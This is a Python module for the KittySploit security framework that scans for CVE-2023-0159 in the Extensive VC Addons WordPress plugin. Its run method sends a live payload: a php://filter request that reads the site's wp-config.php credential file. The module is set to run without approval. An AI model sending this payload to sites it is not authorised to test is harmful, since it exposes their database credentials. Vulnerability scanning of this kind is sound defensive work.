#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The plugin does not validate a parameter passed to the php extract function when loading templates, allowing a."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Extensive VC Addons for WPBakery page builder < 1.9.1 - Unauthenticated RCE Detection',
        'description': 'The plugin does not validate a parameter passed to the php extract function when loading templates, allowing an unauthenticated attacker to override the template path to read arbitrary files from the hosts file system. This may be escalated to RCE using PHP filter chains.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'wordpress', 'wpbakery', 'wp-plugin', 'lfi', 'extensive-vc-addon', 'wprealize', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/239ea870-66e5-4754-952e-74d4dd60b809/',
            'https://github.com/im-hanzou/EVCer',
            'https://github.com/nomi-sec/PoC-in-GitHub',
            'https://github.com/xu-xiang/awesome-security-vul-llm',
            'https://wordpress.org/plugins/extensive-vc-addon/',
        ],
        'cve': 'CVE-2023-0159',
    }

    def run(self):
        path = '/wp-admin/admin-ajax.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='action=extensive_vc_init_shortcode_pagination&options[template]=php://filter/convert.base64-encode/resource=../wp-config.php\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('{"status":"success","message":"Items are loaded","data":',)
        if any(m in body for m in body_any):
            self.set_info(severity='high', reason='Extensive VC Addons for WPBakery page builder < 1.9.1 - Unauthenticated RCE detected', path=path)
            return True
        return False

